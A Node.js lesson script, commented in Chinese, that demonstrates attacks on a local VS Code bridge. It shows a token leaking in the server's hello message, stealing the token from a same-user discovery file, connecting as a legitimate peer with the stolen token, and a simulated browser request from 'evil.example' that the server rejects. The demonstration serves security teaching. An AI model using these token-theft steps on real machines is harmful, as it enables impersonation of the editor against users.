/**
 * 第 3 课第二次答疑用的攻击面演示：token 泄了到底会怎样？
 *
 * 全部真实执行。跑法：
 *   cd projects/dsh-vscode-dev && node work/scripts/lesson3-leak.mjs
 */

import { mkdtempSync, rmSync, readFileSync, readdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'
import { createConnection } from 'node:net'

const here = dirname(fileURLToPath(import.meta.url))
const kitSrc = join(here, '..', '..', 'packages', 'dsh-vscode-kit', 'src')
const { apply } = await import('file://' + join(kitSrc, 'index.js').replace(/\\/g, '/'))
const { discoveryDir } = await import('file://' + join(kitSrc, 'discovery.js').replace(/\\/g, '/'))
const { connect, createLineSplitter } = await import('file://' + join(kitSrc, 'protocol.js').replace(/\\/g, '/'))

const home = mkdtempSync(join(tmpdir(), 'dsh-kit-leak-'))
const dir = discoveryDir(home)

// 用真实插件 + 假 ctx 起桥（和单测同一套），保证 bridge.ping 真的有人应答
function fakeCtx() {
  const disposers = []
  return {
    provided: new Map(),
    provide(n, v) { this.provided.set(n, v) },
    effect(fn) { const d = fn(); if (typeof d === 'function') disposers.push(d); return () => {} },
    async dispose() { for (const d of disposers.reverse()) { try { await d() } catch {} } },
  }
}
const ctx = fakeCtx()
const handle = apply(ctx, { dshHome: home, connectWaitMs: 0, onLog: () => {} })
await handle.boot
await new Promise((r) => setTimeout(r, 50))

const info = JSON.parse(readFileSync(join(dir, readdirSync(dir).find((f) => f.endsWith('.json'))), 'utf8'))
console.log('=== 准备：一个正常运行的桥 ===')
console.log(`  127.0.0.1:${info.port}   pid=${info.pid}`)
console.log(`  名片文件：${dir}\\${info.pid}.json`)
console.log('')

/** 拿一条原始 TCP 连接，返回 {send, readLine, close} */
async function dial(port) {
  const s = createConnection({ port, host: '127.0.0.1' })
  await new Promise((res, rej) => { s.once('connect', res); s.once('error', rej) })
  let buf = ''
  const queue = []
  const waiters = []
  s.on('data', (chunk) => {
    buf += chunk.toString('utf8')
    const lines = buf.split('\n')
    buf = lines.pop() ?? ''
    for (const line of lines) {
      if (!line.trim()) continue
      const msg = JSON.parse(line)
      const w = waiters.shift()
      if (w) w(msg); else queue.push(msg)
    }
  })
  return {
    send: (obj) => s.write(JSON.stringify(obj) + '\n'),
    next: () => new Promise((res, rej) => {
      const timer = setTimeout(() => rej(new Error('timeout')), 1500)
      const take = (m) => { clearTimeout(timer); res(m) }
      if (queue.length) take(queue.shift()); else waiters.push(take)
    }),
    raw: (str) => s.write(str),
    close: () => s.destroy(),
  }
}

console.log('=== 演示 A：本机的「恶意进程」不知道 token，直接连 ===')
{
  const c = await dial(info.port)
  const hello = await c.next() // 服务端连上就发 hello，里面带着 token！（这是一个真实缺陷）
  console.log(`  连上了！服务端主动发的第一条就是 hello：`)
  console.log(`    ${JSON.stringify(hello).slice(0, 120)}…`)
  c.send({ id: 1, method: 'bridge.ping', params: {} }) // 不带 token
  const r = await c.next()
  console.log(`  不带 token 发请求 → ${r.error?.code} ${r.error?.message}`)
  console.log(`    reason=${r.error?.data?.reason}`)
  c.close()
}
console.log('')

console.log('=== 演示 B：恶意进程去读名片文件（同一个用户下的进程都能读）===')
let stolen = null
{
  // 模拟「同一用户下的另一个进程」——无需任何权限提升
  const files = readdirSync(dir).filter((f) => f.endsWith('.json'))
  const card = JSON.parse(readFileSync(join(dir, files[0]), 'utf8'))
  stolen = card.token
  console.log(`  文件列表：${files.join(', ')}`)
  console.log(`  读到的 token：${stolen.slice(0, 24)}…（共 ${stolen.length} 字符）`)
  console.log('  ★ 注意：这里没有任何「破解」动作，就是 readFileSync 一句。')
}
console.log('')

console.log('=== 演示 C：拿偷来的 token 连上去，能干什么 ===')
{
  const c = await dial(info.port)
  await c.next() // hello
  c.send({ id: 1, method: 'bridge.ping', params: { iAm: 'attacker' }, token: stolen })
  const r = await c.next()
  console.log(`  bridge.ping → ${r.result ? '✅ 成功：' + JSON.stringify(r.result) : '❌ ' + r.error?.code}`)
  console.log('  → 攻击者现在是一个「合法对端」了')
  console.log('  → 但他只能收服务端主动推的 hello、发 bridge.ping。')
  console.log('    真正的伤害在反向：他可以冒充编辑器接受 DSH 的 vscode.* 请求。')
  c.close()
}
console.log('')

console.log('=== 演示 D：一个网页（浏览器）能不能打这个端口 ===')
{
  // 浏览器的 fetch 到 127.0.0.1:PORT 会发标准 HTTP 请求。我们照样发一段 HTTP，看服务端怎么应对。
  const s = createConnection({ port: info.port, host: '127.0.0.1' })
  await new Promise((res) => s.once('connect', res))
  let got = ''
  s.on('data', (c) => { got += c.toString('utf8') })
  s.write('GET / HTTP/1.1\r\nHost: 127.0.0.1:' + info.port + '\r\nOrigin: https://evil.example\r\n\r\n')
  await new Promise((r) => setTimeout(r, 400))
  s.destroy()
  console.log('  服务端回给「浏览器」的东西：')
  for (const line of got.split('\n').filter(Boolean).slice(0, 3)) console.log('    ' + line.slice(0, 150))
  console.log('')
  console.log('  ★ 浏览器只会说 HTTP。我们的端口只认 ndjson。')
  console.log('    HTTP 请求被当成「非法 JSON」→ 连接被销毁。')
  console.log('    → 网页打不进这个端口。这是 raw TCP 意外的安全红利。')
}
console.log('')

await handle.stopped
ctx.dispose?.()
rmSync(home, { recursive: true, force: true })
console.log('（临时目录已清理）')
